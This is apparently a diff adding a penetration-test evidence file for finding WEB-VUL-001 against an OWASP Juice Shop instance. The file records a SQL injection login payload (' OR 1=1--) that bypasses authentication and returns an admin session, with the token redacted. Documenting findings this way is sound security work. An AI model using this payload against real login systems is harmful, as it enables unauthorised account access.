@@ -1,0 +1,9 @@
+# Evidence ID: EVD-V1-RES
+# Finding: WEB-VUL-001
+# Date: 2026-10-03T19:33:59+05:30
+# Control (invalid creds) HTTP : 401   (expected 401)
+# Attack  (' OR 1=1--)  HTTP   : 200   (vulnerable if 200)
+# Verdict:
+   VULNERABLE - auth bypass succeeded
+# Response body (tokens redacted):
+{"authentication":{"token":"[REDACTED-JWT]","bid":1,"umail":"admin@juice-sh.op"}}
